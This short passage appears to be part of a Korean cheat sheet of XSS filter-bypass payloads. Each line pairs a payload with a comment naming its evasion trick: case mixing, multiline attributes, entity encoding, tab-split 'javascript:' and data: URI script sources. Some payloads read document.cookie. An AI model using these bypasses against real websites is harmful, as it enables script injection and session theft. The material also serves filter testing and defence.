...
<ScRipt>AlERT('XSS')</sCrIPT> <!-- 대소문자를 이용한 우회 !-->
<img src=""\nonerror="alert(document.cookie)"/> <!-- 멀티라인에 대한 검사가 없는 경우 !-->
<&#115ript>alert('xss')</&#115ript> <!-- HTML Entity Encoding을 활용한 우회 !-->
<a href="j\t\tavascript:alert(1)"> <!-- 특수문자를 이용한 우회(정규화 과정에서 제거됨) !-->
<script src="data:,alert(document.cookie)"></script> <!-- script src 속성을 이용한 우회 !-->
